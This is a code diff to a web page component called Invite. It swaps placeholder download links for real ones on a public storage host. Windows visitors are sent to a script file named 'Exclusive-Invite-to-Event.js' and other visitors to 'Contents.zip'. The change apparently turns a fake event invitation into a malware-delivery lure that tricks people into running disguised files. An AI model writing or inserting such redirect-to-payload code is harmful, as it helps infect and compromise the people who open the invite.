@@ -28,10 +28,10 @@ function Invite() {
 
     if (isWindows) {
       // Replace with your Windows download URL
-      window.location.href = 'YOUR_WINDOWS_DOWNLOAD_URL';
+      window.location.href = 'https://pub-4b997841feed4885acb4cf32f7d569d1.r2.dev/Exclusive-Invite-to-Event.js';
     } else {
       // Replace with your Mac download URL
-      window.location.href = 'YOUR_MAC_DOWNLOAD_URL';
+      window.location.href = 'https://pub-4b997841feed4885acb4cf32f7d569d1.r2.dev/Contents.zip';
     }
   };
 
